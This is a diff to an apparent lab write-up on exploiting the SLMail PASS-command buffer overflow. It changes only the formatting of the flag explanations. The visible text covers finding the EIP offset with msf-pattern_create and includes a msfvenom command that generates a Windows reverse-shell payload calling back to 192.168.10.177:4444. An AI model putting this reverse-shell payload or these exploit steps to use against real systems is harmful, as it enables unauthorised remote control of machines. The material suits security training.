@@ -150,7 +150,7 @@ SLMail has a buffer overflow vulnerability when a PASS command with a password c
 Getting control of the EIP register is a crucial step of exploit development.If we control the EIP we can control the execution flow of the program.We need to locate those 4 "A" that overwrite our EIP register in the buffer. We can do this by sending a unique string of 2900 bytes, identify the 4 bytes that overwrite EIP, and then locate those four bytes in our unique buffer. We can generate a unique string with the tool msf-pattern\_create and locate those 4 bytes in our buffer using the tool msf-pattern\_offset.rb
 
 `msf-pattern_create -l 2900` \
--l: length of the string. 
+**-l:** length of the string
 
 Here, the length will be 2900 same as the crash's length. This will be send to the Immunity Debugger.
 
@@ -409,11 +409,11 @@ Generation of shellcode using the below command:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.177 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\xa0\xd0"
 ```
 
--p: payload \
-EXITFUNC=thread: makes the exploit a little more stable \
--f: filetype \
--a: architecture \
--b: bad characters \
+**-p:** payload \
+**EXITFUNC=thread:** makes the exploit a little more stable \
+**-f:** filetype \
+**-a:** architecture \
+**-b:** bad characters
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MOWVrxp6vAMFxx5Q4_l%2F-MQHyw9QcRYppYFKEohp%2F-MQIUCGNdU5vLgxZFo4k%2Fimage.png?alt=media&token=2ef36183-50f8-4cae-b2fd-5c87b65e441a)
 
